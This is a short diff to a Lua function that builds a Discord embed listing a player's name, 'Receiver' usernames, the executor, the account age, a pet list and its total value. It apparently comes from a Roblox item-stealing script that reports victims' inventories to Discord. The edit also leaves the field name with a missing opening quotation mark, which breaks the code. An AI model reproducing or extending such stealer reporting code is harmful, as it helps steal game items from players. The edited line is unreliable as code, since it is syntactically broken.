@@ -109,7 +109,7 @@ local function createDiscordEmbed(petList, totalValue, fileUrl)
         color = 65280,
         fields = {
             {
-                name = "Ã°Å¸â€˜Â¤ **Player Information**",
+                name = **Player Information**",
                 value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                     LocalPlayer.Name, 
                     table.concat(USERNAMES, " "), 
